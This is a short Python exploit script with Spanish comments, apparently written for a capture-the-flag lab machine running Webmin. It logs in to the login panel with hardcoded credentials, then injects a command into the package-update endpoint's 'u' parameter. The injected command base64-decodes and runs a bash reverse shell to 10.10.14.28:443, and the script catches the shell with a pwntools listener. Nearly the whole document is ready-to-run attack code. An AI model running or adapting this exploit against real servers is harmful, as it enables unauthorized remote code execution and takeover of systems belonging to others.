#!/usr/bin/env python3

import requests
import urllib3
import signal
import sys
from pwn import *
import threading

# Function
def def_handler(sig, frame):
    print("\n\n[!] Saliendo...")
    sys.exit(1)
# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# URL to Hack
target_url = "https://10.10.10.160:10000/session_login.cgi" # aqui se encuentra el panel de login
vuln_url = "https://10.10.10.160:10000/package-updates/update.cgi" # aqui se encuentra la ruta donde esta la vulnerabilidad ya que si recordamos tiene que ver con la actualizacion de paquetes
listen_port = 443 # vamos a estar en escucha en el puerto 443
def main():
    
    urllib3.disable_warnings() # esto es para manejar lo del certificado ssl
    session = requests.session() # creamos la session
    session.verify = False # Evitamos problemas con el certificado ssl

    data_post = { # enviamos la data por post para logearnos
        'user': 'Matt',
        'pass': 'computer2008'
    }

    headers = { # Enviamos la Cookie que nos pide el servidor
        'Cookie': 'redirect=1; testing=1; sid=x'
    }
    
    r = session.post(target_url, data=data_post, headers=headers) # Enviamos toda la informacion al panel de login
    post_data = [('u', 'acl/apt'),('u', ' | bash -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yOC80NDMgMD4mMQ== | base64 -d | bash"'), ('ok_top', 'Update Selected Packages')] # enviamos la data que necesitamos para obtener el RCE
    # Tiene que estar en base64 ❯ echo -n "bash -i >& /dev/tcp/ip/443 0>&1" | base64
    headers = {
        'Referer': 'https://10.10.10.160:10000/package-updates/?xnavigation=1'
    }
    
    r = session.post(vuln_url, data=post_data, headers=headers)
    print(r.text)

if __name__ == '__main__':
    try:
        threading.Thread(target=main, args=()).start() # arrancamos un hilo
    except Exception as e:
        log.error(str(e)) # ver algun error que ocurra

    shell = listen(listen_port, timeout=10).wait_for_connection()
    shell.interactive() # recibimos la shell

